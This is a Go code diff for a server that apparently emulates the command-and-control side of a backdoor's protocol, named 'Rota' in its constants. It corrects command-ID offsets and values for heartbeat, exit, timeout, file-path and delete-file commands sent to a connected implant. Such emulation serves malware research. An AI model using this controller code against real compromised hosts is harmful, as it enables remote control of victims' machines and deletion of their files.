@@ -41,7 +41,7 @@ func handleRequest(conn net.Conn) {
 
 			// parse cmd_id
 			cmd_id := make([]byte, 2)
-			copy(cmd_id, data[27:])
+			copy(cmd_id, data[14:])
 			fmt.Println("CMD ID is: " + hex.EncodeToString(cmd_id))
 
 			if bytes.Equal(cmd_id, pkt.Rota_c2_heartbeat) {
@@ -78,20 +78,20 @@ func handleRequest(conn net.Conn) {
 			case "heartbeat":
 				// Setting heart beat
 				fmt.Println("Sending Heartbeat...")
-				copy(initialHdr[27:], []byte{0x5c, 0xca})
+				copy(initialHdr[14:], []byte{0x5c, 0xca, 0x72, 0x07})
 				conn.Write(initialHdr)
 
 			case "exit":
 				// Setting heart beat
 				fmt.Println("Sending exit...")
-				copy(initialHdr[27:], []byte{0x13, 0x8e})
+				copy(initialHdr[14:], []byte{0x13, 0x8e, 0x3e, 0x06})
 				conn.Write(initialHdr)
 				conn.Close()
 
 			case "timeout":
 				// Setting heart beat
 				fmt.Println("Sending timeout...")
-				copy(initialHdr[27:], []byte{0x17, 0xb1})
+				copy(initialHdr[14:], []byte{0x17,0xB1, 0xCC, 0x04})
 				// setting length to 1 byte
 				copy(initialHdr[4:], []byte{0x01, 0x00, 0x00, 0x00})
 
@@ -112,7 +112,7 @@ func handleRequest(conn net.Conn) {
 				binary.LittleEndian.PutUint32(fpath_barray, fpath_len) // copy  hex length value into fpath_barray
 
 				// cmd id
-				copy(initialHdr[27:], []byte{0x2c, 0xd9})
+				copy(initialHdr[14:], []byte{0x2C, 0xD9, 0x07, 0x00})
 				// size of payload (4 bytes)
 				copy(initialHdr[4:], fpath_barray)
 
@@ -134,7 +134,7 @@ func handleRequest(conn net.Conn) {
 				binary.LittleEndian.PutUint32(fpath_barray, fpath_len)
 
 				// cmd id for delete file
-				copy(initialHdr[27:], []byte{0x12, 0xb3})
+				copy(initialHdr[14:], []byte{0x12, 0xB3, 0x62, 0x09})
 
 				// setting length to length of file path
 				copy(initialHdr[4:], fpath_barray)
@@ -157,7 +157,7 @@ func handleRequest(conn net.Conn) {
 				binary.LittleEndian.PutUint32(data_barray, data_len)
 
 				// cmd id for delete file
-				copy(initialHdr[27:], []byte{0x2e, 0x25})
+				copy(initialHdr[14:], []byte{0x2E, 0x25, 0x99, 0x02})
 
 				// setting length to length of file path
 				copy(initialHdr[4:], data_barray)
